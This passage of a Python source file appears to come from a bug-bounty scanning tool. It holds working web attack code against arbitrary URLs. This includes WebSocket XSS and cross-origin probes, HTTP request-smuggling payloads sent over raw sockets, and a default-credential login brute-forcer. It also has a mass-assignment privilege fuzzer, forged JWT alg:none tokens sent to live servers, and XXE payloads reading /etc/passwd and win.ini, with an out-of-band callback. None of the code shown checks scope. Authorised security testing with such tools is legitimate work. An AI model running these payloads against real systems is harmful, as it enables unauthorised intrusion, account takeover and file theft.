                result["messages"].append({"direction": "recv", "data": str(msg)[:200]})
            except Exception:
                pass

            # Send XSS probe
            xss_payload = "<script>alert('ws-xss')</script>"
            try:
                ws.send(xss_payload)
                ws.settimeout(3)
                response = ws.recv()
                result["messages"].append({"direction": "send", "data": xss_payload})
                result["messages"].append({"direction": "recv", "data": str(response)[:200]})
                if xss_payload.lower() in (response or "").lower():
                    result["xss_reflected"] = True
            except Exception:
                pass

            ws.close()
        except Exception as e:
            result["error"] = str(e)[:200]

        return result

    def discover_ws_endpoints(self, page_url: str) -> List[str]:
        """Scan a page HTML for WebSocket URLs (ws:// or wss://)."""
        resp = _get(page_url, timeout=12)
        if not resp or resp.status_code != 200:
            return []
        text = resp.text or ""
        pattern = re.compile(r'(wss?://[^"\' \t\n<>]{5,100})', re.IGNORECASE)
        endpoints = list(set(pattern.findall(text)))
        return endpoints[:10]

    def scan(self, target: str) -> str:
        """Scan a URL for WebSocket endpoints and test security."""
        if not self._check_ws_available():
            return ("  ⚠️  websocket-client not installed.\n"
                    "  Install with: pip install websocket-client\n"
                    "  Then re-run: /bugbounty websocket <url>")

        lines = [f"🔌 WebSocket Security Scan: {target}", "═" * 55]

        # Discover WS endpoints from page
        if target.startswith("http"):
            ws_urls = self.discover_ws_endpoints(target)
        else:
            ws_urls = [target]

        if not ws_urls:
            lines.append("  ℹ️  No WebSocket endpoints found in page source.")
            lines.append("  💡 Tip: Check browser DevTools Network tab → WS filter")
            return "\n".join(lines)

        lines.append(f"  Found {len(ws_urls)} WebSocket endpoint(s):")
        for ws_url in ws_urls:
            lines.append(f"\n  📡 Testing: {ws_url}")
            result = self.test_connection(ws_url)

            if result.get("error") and not result.get("connected"):
                lines.append(f"    ❌ Connection failed: {result['error'][:80]}")
                continue

            if result.get("accepted_evil_origin"):
                lines.append(f"    🟠 [HIGH] WebSocket accepts connections from cross-origin (evil.com)!")
                lines.append(f"       Impact: WebSocket CSRF — malicious sites can connect as the victim")

            if result.get("xss_reflected"):
                lines.append(f"    🔴 [HIGH] XSS payload reflected back in WebSocket message!")
                lines.append(f"       Impact: WebSocket-based XSS may be exploitable")

            for msg in result.get("messages", [])[:3]:
                direction = "→ SENT" if msg["direction"] == "send" else "← RECV"
                lines.append(f"    {direction}: {msg['data'][:80]}")

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 15. REQUEST SMUGGLING ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class RequestSmugglingEngine:
    """
    HTTP Request Smuggling detection (CL.TE and TE.CL techniques).

    CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding.
    TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length.

    Uses raw sockets for precise header control (requests/httpx cannot do this).
    """

    def _raw_request(self, host: str, port: int, request_bytes: bytes,
                     timeout: int = 10) -> bytes:
        """Send a raw HTTP/HTTPS request and return the response bytes."""
        import socket as _sock
        try:
            if port == 443:
                import ssl
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(
                    _sock.create_connection((host, port), timeout=timeout),
                    server_hostname=host
                )
            else:
                sock = _sock.create_connection((host, port), timeout=timeout)
            sock.sendall(request_bytes)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            sock.close()
            return resp
        except Exception as e:
            logger.debug(f"Raw socket error: {e}")
            return b""

    def test_cl_te(self, url: str) -> Dict:
        """
        CL.TE smuggling probe.
        Sends a request where Content-Length says data is done,
        but Transfer-Encoding chunked carries extra data.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        # CL.TE: Ambiguous request — backend processes the extra 'G'
        # If smuggled, subsequent request will see 'GPOST /...'
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            # Timeout-based detection: server hanging indicates partial body read
            if elapsed > 5 and b"400" not in resp[:50] and b"408" not in resp[:50]:
                return {
                    "technique": "CL.TE",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible smuggling hang",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
            # Error response can also indicate smuggling detected
            if b"400" in resp[:100]:
                return {
                    "technique": "CL.TE",
                    "confirmed": False,
                    "evidence": "400 Bad Request — TE header may be stripped",
                }
        except Exception as e:
            return {"technique": "CL.TE", "confirmed": False, "error": str(e)}

        return {"technique": "CL.TE", "confirmed": False, "evidence": "No anomaly"}

    def test_te_cl(self, url: str) -> Dict:
        """
        TE.CL smuggling probe.
        Frontend strips Transfer-Encoding, backend keeps it.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            if elapsed > 5:
                return {
                    "technique": "TE.CL",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible backend hang on partial chunk",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
        except Exception as e:
            return {"technique": "TE.CL", "confirmed": False, "error": str(e)}

        return {"technique": "TE.CL", "confirmed": False, "evidence": "No anomaly"}

    def scan(self, url: str) -> str:
        """Run both CL.TE and TE.CL probes against a target."""
        lines = [f"🚢 HTTP Request Smuggling Probe: {url}", "═" * 55,
                 "  ⚠️  Note: Timing-based — requires network stability for accuracy"]

        for test_fn in [self.test_cl_te, self.test_te_cl]:
            try:
                result = test_fn(url)
                tech = result.get("technique", "?")

                if result.get("confirmed") == "possible":
                    lines.append(f"\n  🟠 [HIGH] Possible {tech} Smuggling detected!")
                    lines.append(f"       Evidence: {result.get('evidence', '')}")
                    lines.append(f"       Time elapsed: {result.get('elapsed', 0):.2f}s")
                    lines.append(f"       💡 Verify with Burp Suite Pro → HTTP Request Smuggler extension")
                elif result.get("error"):
                    lines.append(f"  ⚠️  {tech}: Socket error — {result['error'][:60]}")
                else:
                    lines.append(f"  ✅ {tech}: No smuggling indicators (response normal)")
            except Exception as e:
                lines.append(f"  ⚠️  {test_fn.__name__}: {e}")

        lines.append("\n  ➜ For definitive detection, use: https://github.com/defparam/smuggler")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# ENHANCEMENTS: Existing classes — monkey-patched additions
# ══════════════════════════════════════════════════════════════════════════════


# ── AuthSessionEngine: test_login_bypass, test_mass_assignment ───────────────

def _ase_test_login_bypass(self, login_url: str, username_field: str = "username",
                            password_field: str = "password") -> str:
    """
    Test for default credentials and login bypass.
    Sends common default username/password combinations.
    """
    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("administrator", "administrator"), ("admin", "letmein"),
        ("test", "test"), ("guest", "guest"), ("user", "user"),
        ("admin", "pass"), ("admin", "1234"), ("admin", "Password1"),
        ("admin", "P@ssw0rd"), ("admin", "changeme"), ("admin", ""),
        ("", "admin"), ("admin", "admin1"), ("superadmin", "superadmin"),
    ]

    lines = [f"🔓 Login Bypass Test: {login_url}", "─" * 55]
    findings = []

    # Baseline: fetch the login page
    baseline = _get(login_url, timeout=8)
    if not baseline:
        return "  ❌ Cannot reach login URL"
    baseline_len = len(baseline.content)
    baseline_status = baseline.status_code

    for username, password in DEFAULT_CREDS:
        try:
            resp = _post(login_url, data={username_field: username, password_field: password},
                         timeout=8)
            if not resp:
                continue

            # Indicators of successful login:
            # 1. Redirect to a non-login page
            if resp.status_code in [301, 302, 303, 307, 308]:
                loc = resp.headers.get("Location", "")
                if loc and "login" not in loc.lower() and "error" not in loc.lower():
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "location": loc,
                        "message": f"Possible login with {username}:{password} → redirects to {loc}",
                    })

            # 2. Response significantly longer than failed login
            elif resp.status_code == 200:
                len_diff = len(resp.content) - baseline_len
                body = (resp.text or "").lower()
                # Look for success indicators
                success_indicators = [
                    "dashboard", "logout", "sign out", "welcome",
                    "profile", "account", "settings", "home",
                ]
                if any(ind in body for ind in success_indicators) and len_diff > 500:
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "len_diff": len_diff,
                        "message": f"Possible login with {username}:{password} (success indicators in body)",
                    })
        except Exception:
            continue

    if findings:
        lines.append(f"  🔴 {len(findings)} possible default credential(s) found!")
        for f in findings:
            lines.append(f"    🔴 [CRITICAL] {f['username']}:{f['password']} → {f['message'][:100]}")
        lines.append("  ➜ Verify manually — these may be true positives!")
    else:
        lines.append(f"  ✅ No default credentials worked ({len(DEFAULT_CREDS)} combinations tested)")
        lines.append(f"  💡 Also test: /admin, /wp-admin, /phpmyadmin for admin panels")

    return "\n".join(lines)


def _ase_test_mass_assignment(self, url: str, extra_fields: dict = None) -> str:
    """
    Test for mass assignment vulnerability by sending extra fields
    like role=admin, isAdmin=true, is_admin=1 in POST/PUT requests.
    """
    MASS_ASSIGN_PAYLOADS = [
        {"role": "admin"},
        {"isAdmin": "true"},
        {"is_admin": "1"},
        {"admin": "true"},
        {"privilege": "admin"},
        {"userType": "admin"},
        {"account_type": "premium"},
        {"subscription": "enterprise"},
        {"verified": "true"},
        {"email_verified": "true"},
    ]

    if extra_fields:
        MASS_ASSIGN_PAYLOADS.insert(0, extra_fields)

    lines = [f"🏋️  Mass Assignment Test: {url}", "─" * 55]

    # Baseline GET
    baseline = _get(url, timeout=8)
    if not baseline:
        return f"  ❌ Cannot reach {url}"

    baseline_body = (baseline.text or "").lower()
    findings = []

    for payload in MASS_ASSIGN_PAYLOADS:
        try:
            resp = _post(url, data=payload, timeout=8)
            if not resp:
                continue
            body = (resp.text or "").lower()

            # Look for elevated privilege indicators in response
            indicators = ["admin", "superuser", "privilege", "role", "verified"]
            for ind in indicators:
                if ind in body and ind not in baseline_body:
                    key = list(payload.keys())[0]
                    val = list(payload.values())[0]
                    findings.append({
                        "payload": payload,
                        "indicator": ind,
                        "message": f"Mass assignment: server reflected '{ind}' after sending {key}={val}",
                    })
                    break
        except Exception:
            continue

    if findings:
        lines.append(f"  🟠 {len(findings)} potential mass assignment issue(s):")
        for f in findings:
            lines.append(f"    🟠 [HIGH] {f['message']}")
    else:
        lines.append(f"  ✅ No mass assignment indicators found ({len(MASS_ASSIGN_PAYLOADS)} payloads tested)")
        lines.append("  💡 Also test PUT/PATCH endpoints — they're more likely to be vulnerable")

    return "\n".join(lines)


AuthSessionEngine.test_login_bypass = _ase_test_login_bypass
AuthSessionEngine.test_mass_assignment = _ase_test_mass_assignment


# ── JWTScanner: active token testing ─────────────────────────────────────────

def _jwt_test_forged_against_server(self, original_token: str, test_url: str,
                                     auth_header: str = "Authorization") -> Dict:
    """
    Actually send the forged alg:none token to the server and check response.
    Returns dict with confirmed bool and evidence.
    """
    forged = self._forge_alg_none(original_token)
    if not forged:
        return {"confirmed": False, "reason": "Could not forge alg:none token"}

    # Baseline: request without auth
    no_auth = _get(test_url, timeout=8)
    baseline_status = getattr(no_auth, "status_code", 0)
    baseline_len = len(getattr(no_auth, "content", b""))

    # Test with forged token
    test_resp = _get(test_url, headers={auth_header: f"Bearer {forged}"}, timeout=8)
    if not test_resp:
        return {"confirmed": False, "reason": "No response from server"}

    # Test with original token
    orig_resp = _get(test_url, headers={auth_header: f"Bearer {original_token}"}, timeout=8)
    orig_status = getattr(orig_resp, "status_code", 0)
    orig_len = len(getattr(orig_resp, "content", b""))

    forged_status = test_resp.status_code
    forged_len = len(test_resp.content)

    result = {
        "forged_token": forged[:80] + "...",
        "baseline_status": baseline_status,
        "original_token_status": orig_status,
        "forged_token_status": forged_status,
        "url": test_url,
    }

    # Confirmed if forged token gets same access as original
    if (orig_status == 200 and forged_status == 200 and
            abs(forged_len - orig_len) < orig_len * 0.1):
        result.update({
            "confirmed": True,
            "severity": "CRITICAL",
            "evidence": f"Forged alg:none token accepted! Same response as valid token (status {forged_status}, size {forged_len}b)",
        })
    elif forged_status == 200 and baseline_status != 200:
        result.update({
            "confirmed": "possible",
            "severity": "HIGH",
            "evidence": f"Forged token got {forged_status} while no-auth got {baseline_status} — suspicious",
        })
    else:
        result.update({
            "confirmed": False,
            "reason": f"Forged token rejected (status {forged_status})",
        })

    return result


JWTScanner.test_forged_against_server = _jwt_test_forged_against_server


# ── CVSS31Calculator: suggest_vector ─────────────────────────────────────────

def _cvss_suggest_vector(self, vuln_type: str) -> str:
    """
    Suggest a CVSS 3.1 vector string based on vulnerability type.
    Returns a pre-filled vector + calculated score.
    """
    VULN_VECTORS = {
        "xss_reflected":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Reflected XSS"),
        "xss_stored":         ("AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", "Stored XSS"),
        "sql_injection":      ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "sqli":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "open_redirect":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Open Redirect"),
        "ssrf":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSRF"),
        "idor":               ("AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "IDOR"),
        "cors":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", "CORS Misconfiguration"),
        "ssti":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSTI / RCE"),
        "path_traversal":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "Path Traversal / LFI"),
        "missing_header":     ("AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N", "Missing Security Header"),
        "csrf":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", "CSRF"),
        "subdomain_takeover": ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "Subdomain Takeover"),
        "jwt_weak_secret":    ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT Weak Secret"),
        "jwt_alg_none":       ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT alg:none bypass"),
        "rce":                ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Remote Code Execution"),
        "xxe":                ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", "XXE Injection"),
        "crlf":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", "CRLF Injection"),
        "host_header":        ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Host Header Injection"),
        "sensitive_file":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Sensitive File Exposure"),
        "prototype_pollution": ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N", "Prototype Pollution"),
    }

    key = vuln_type.lower().replace("-", "_").replace(" ", "_")
    if key not in VULN_VECTORS:
        # Try partial match
        for k in VULN_VECTORS:
            if k in key or key in k:
                key = k
                break
        else:
            available = ", ".join(VULN_VECTORS.keys())
            return f"  ❌ Unknown vuln type. Available: {available}"

    vector, name = VULN_VECTORS[key]
    result = self.calculate(vector)
    report = self.format_report(result)

    lines = [
        f"🎯 CVSS Suggestion for: {name}",
        f"  Vector: {vector}",
        report,
        "",
        f"  💡 This is a typical vector. Adjust PR/AC/UI/S based on your specific finding.",
    ]
    return "\n".join(lines)


CVSS31Calculator.suggest_vector = _cvss_suggest_vector


# ── ShodanEngine: EPSS lookup ─────────────────────────────────────────────────

def _shodan_get_epss_scores(self, cves: List[str]) -> Dict[str, Dict]:
    """
    Fetch EPSS (Exploit Prediction Scoring System) probability scores
    for a list of CVE IDs. Uses the free Cyentia EPSS API.
    Returns {cve_id: {"epss": float, "percentile": float}}.
    """
    if not cves:
        return {}
    # EPSS API accepts comma-separated CVE IDs (max ~30)
    cve_list = ",".join(cves[:20])
    url = f"https://api.first.org/data/v1/epss?cve={cve_list}"
    resp = _get(url, timeout=12)
    if not resp or resp.status_code != 200:
        return {}
    try:
        data = resp.json().get("data", [])
        return {
            entry["cve"]: {
                "epss":       float(entry.get("epss", 0)),
                "percentile": float(entry.get("percentile", 0)),
            }
            for entry in data
            if "cve" in entry
        }
    except Exception:
        return {}


def _shodan_format_report_with_epss(self, result: Dict) -> str:
    """Extended format_report that includes EPSS scores for CVEs."""
    base_report = ShodanEngine.format_report.__wrapped__(self, result) if hasattr(ShodanEngine.format_report, '__wrapped__') else ""

    cves = result.get("cves", [])
    if not cves or "error" in result or result.get("note"):
        return base_report  # Fall back to base report

    # Get EPSS scores
    epss_scores = self.get_epss_scores(cves)

    lines = [
        f"🌐 Shodan InternetDB: {result.get('target', result.get('ip', '?'))}",
        f"   IP: {result.get('ip', '?')}",
        "═" * 55,
    ]

    ports = result.get("ports", [])
    if ports:
        lines.append(f"  📡 Open Ports ({len(ports)}): {', '.join(str(p) for p in ports[:20])}")
        dangerous = [p for p in ports if p in [21, 22, 23, 25, 3306, 5432, 27017, 6379, 11211, 9200, 5601]]
        port_names = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 3306: "MySQL",
                      5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis",
                      11211: "Memcached", 9200: "Elasticsearch", 5601: "Kibana"}
        for p in dangerous:
            lines.append(f"    🔴 Port {p} ({port_names.get(p, '?')}) is open!")

    if cves:
        lines.append(f"\n  🚨 Known CVEs ({len(cves)}) with EPSS Exploit Probability:")
        for cve in cves[:10]:
            epss = epss_scores.get(cve, {})
            epss_pct = epss.get("epss", 0) * 100
            percentile = epss.get("percentile", 0) * 100
            if epss_pct > 10:
                risk_icon = "🔴"
                risk_label = f"HIGH EXPLOIT RISK: {epss_pct:.1f}% probability"
            elif epss_pct > 1:
                risk_icon = "🟠"
                risk_label = f"Moderate exploit risk: {epss_pct:.1f}%"
            else:
                risk_icon = "🟡"
                risk_label = f"Low exploit risk: {epss_pct:.2f}%"

            lines.append(f"    {risk_icon} {cve}")
            if epss:
                lines.append(f"       EPSS: {epss_pct:.2f}% exploit prob | Percentile: {percentile:.0f}th")
            lines.append(f"       → https://nvd.nist.gov/vuln/detail/{cve}")
    else:
        lines.append("  ✅ No known CVEs indexed")

    cpes = result.get("cpes", [])
    if cpes:
        lines.append(f"\n  🖥️  Software (CPE): {', '.join(cpes[:6])}")

    tags = result.get("tags", [])
    if tags:
        lines.append(f"\n  🏷️  Tags: {', '.join(tags)}")

    lines.append("\n" + "═" * 55)
    return "\n".join(lines)


ShodanEngine.get_epss_scores = _shodan_get_epss_scores
ShodanEngine.format_report = _shodan_format_report_with_epss


# ══════════════════════════════════════════════════════════════════════════════
# 16. XXE PROBE ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class XXEProbeEngine:
    """
    XML External Entity (XXE) injection testing.
    Tests XML-accepting endpoints for:
      1. File read via classic XXE (expect /etc/passwd or Windows equivalents)
      2. OOB XXE via Interactsh for blind detection
      3. Error-based XXE
      4. Parameter entity XXE
    """

    XXE_PAYLOADS = [
        # Classic file read
        (
            "xxe_classic",
            "HIGH",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',
            ["root:", "nobody:", "/bin/bash", "/sbin/nologin"],
        ),
        # Windows file read
        (
            "xxe_windows",
            "HIGH",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>''',
            ["[fonts]", "[extensions]", "[files]", "for 16-bit"],
        ),
        # Error-based XXE
        (
            "xxe_error",
            "MEDIUM",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/nonexistent_bb_probe">
  %xxe;
]>
<root/>''',
            ["nonexistent", "No such file", "error", "DOCTYPE"],
        ),
    ]

    def probe(self, url: str, use_oob: bool = True) -> List[Dict]:
        """
        Test a URL for XXE by sending XML payloads.
        Tries common XML content types.
        """
        findings = []
        content_types = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
        ]

        # OOB setup via Interactsh
        oob = None
        if use_oob:
            oob = _interactsh_setup()

        for ct in content_types:
            for xx_id, severity, payload_text, indicators in self.XXE_PAYLOADS:
                try:
                    resp = _post(
                        url,
                        data=payload_text.encode("utf-8"),
                        headers={"Content-Type": ct},
                        timeout=10,
                    )
                    if not resp:
                        continue

                    body = resp.text or ""

                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            findings.append({
                                "type": f"xxe_{xx_id}",
                                "severity": severity,
                                "url": url,
                                "content_type": ct,
                                "indicator": indicator,
                                "message": f"XXE file read confirmed! Found '{indicator}' in response",
                                "confirmed": True,
                            })
                            break

                    # Check for error-based disclosure
                    if resp.status_code in [500, 400] and any(
                        ind in body.lower() for ind in ["xml", "entity", "doctype", "parse"]
                    ):
                        findings.append({
                            "type": "xxe_error_disclosure",
                            "severity": "MEDIUM",
                            "url": url,
                            "content_type": ct,
                            "message": f"XML parsing error in response — server processes XML with {ct}",
                            "evidence": body[:200],
                            "confirmed": "possible",
                        })

                except Exception:
                    continue

        # OOB blind XXE
        if oob and oob.get("ok"):
            callback = oob["callback_url"]
            oob_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback}/xxe">
  %xxe;
]>
<root/>'''.format(callback=callback)

            for ct in content_types[:1]:
                try:
                    _post(url, data=oob_payload.encode(), headers={"Content-Type": ct}, timeout=8)
                    import time as _t
                    _t.sleep(5)
                    poll = _get(
                        f"{oob['server']}/poll?id={oob['correlation_id']}&secret={oob['correlation_id']}",
                        timeout=8,
                    )
                    if poll and poll.status_code == 200:
                        data = poll.json() if poll.text else {}
                        interactions = data.get("data") or data.get("interactions") or []
                        if interactions:
                            findings.append({
                                "type": "xxe_oob_blind",
                                "severity": "CRITICAL",
                                "url": url,
                                "message": "Blind XXE confirmed via OOB Interactsh callback!",
                                "callback": callback,
                                "interactions": interactions[:3],
                                "confirmed": True,
                            })
                except Exception:
                    pass

        # Deduplicate
        seen = set()
        unique = []
        for f in findings:
            key = (f["type"], f.get("indicator", ""))
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def format_report(self, findings: List[Dict]) -> str:
        if not findings:
            return "  ✅ No XXE indicators found (tested classical + OOB techniques)"

        lines = [f"💉 XXE Injection Results — {len(findings)} finding(s)", "═" * 55]
        for f in findings:
            sev = f.get("severity", "MEDIUM")
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sev, "•")
            lines.append(f"  {icon} [{sev}] {f['message']}")
            if f.get("indicator"):
                lines.append(f"       Indicator  : '{f['indicator']}'")
            if f.get("content_type"):
                lines.append(f"       Content-Type: {f['content_type']}")
            if f.get("callback"):
                lines.append(f"       OOB Callback: {f['callback']}")
        lines.append("  ➜ Submit this immediately — XXE is typically HIGH/CRITICAL bounty")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 17. HUNT SESSION  (persistence across runs)
# ══════════════════════════════════════════════════════════════════════════════

class HuntSession:
    """
    Persist the full state of an active bug bounty hunt across runs.
    Stores: scope, findings, discovered subdomains, scan timestamps,
            session metadata (program, platform, start date).

    Files saved to: hunt_sessions/<domain>.json
    """

    SESSIONS_DIR = "hunt_sessions"

    def __init__(self, domain: str = ""):
        self.domain = domain
        self.scope: List[str] = []
        self.findings: List[Dict] = []
        self.subdomains: List[str] = []
        self.scanned_urls: List[str] = []
        self.metadata: Dict = {}
        self._path = ""
        os.makedirs(self.SESSIONS_DIR, exist_ok=True)
        if domain:
            self._path = os.path.join(self.SESSIONS_DIR, f"{domain.replace('.', '_')}.json")

    def save(self) -> str:
        """Save current hunt state to disk."""
        if not self._path:
            return "  ❌ No domain set — call HuntSession(domain)"
        state = {
            "domain": self.domain,
            "scope": self.scope,
            "findings": self.findings,
            "subdomains": self.subdomains,
            "scanned_urls": self.scanned_urls,
            "metadata": {
                **self.metadata,
                "last_updated": datetime.now().isoformat(),
            },
        }
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2)
        return f"  ✅ Hunt session saved: {self._path}"

    def load(self, domain: str = "") -> bool:
        """Load a saved hunt session."""
        domain = domain or self.domain
        if not domain:
            return False
        path = os.path.join(self.SESSIONS_DIR, f"{domain.replace('.', '_')}.json")
        if not os.path.exists(path):
            return False
        try:
            with open(path, "r", encoding="utf-8") as f:
                state = json.load(f)
            self.domain = state.get("domain", domain)
            self.scope = state.get("scope", [])
            self.findings = state.get("findings", [])
            self.subdomains = state.get("subdomains", [])
            self.scanned_urls = state.get("scanned_urls", [])
            self.metadata = state.get("metadata", {})
            self._path = path
            return True
        except Exception:
            return False

    def status(self) -> str:
        """Return a summary of the current hunt session."""
        lines = [
            f"🏹 Hunt Session: {self.domain or '(none)'}",
            "─" * 55,
            f"  Scope      : {len(self.scope)} domain(s)",
            f"  Subdomains : {len(self.subdomains)} discovered",
            f"  Findings   : {len(self.findings)} logged",
            f"  Scanned    : {len(self.scanned_urls)} URL(s)",
        ]
        if self.metadata.get("last_updated"):
            lines.append(f"  Last Update: {self.metadata['last_updated'][:16]}")
        if self._path:
            lines.append(f"  Save Path  : {self._path}")
        return "\n".join(lines)

    @classmethod
    def list_sessions(cls) -> str:
        """List all saved hunt sessions."""
        sessions_dir = cls.SESSIONS_DIR
        if not os.path.exists(sessions_dir):
            return "  ℹ️  No hunt sessions directory found."
        files = [f for f in os.listdir(sessions_dir) if f.endswith(".json")]
        if not files:
            return "  ℹ️  No saved hunt sessions yet."
        lines = [f"📂 Saved Hunt Sessions ({len(files)}):"]
        for f in sorted(files):
            path = os.path.join(sessions_dir, f)
            try:
                with open(path) as fh:
                    state = json.load(fh)
                domain = state.get("domain", f.replace("_", ".")[:-5])
                updated = state.get("metadata", {}).get("last_updated", "?")[:10]
                n_findings = len(state.get("findings", []))
                lines.append(f"  • {domain:<30} {n_findings} finding(s) | Updated: {updated}")
            except Exception:
                lines.append(f"  • {f} (unreadable)")
        lines.append(f"\n  ➜ Load: /bugbounty session load <domain>")
        return "\n".join(lines)
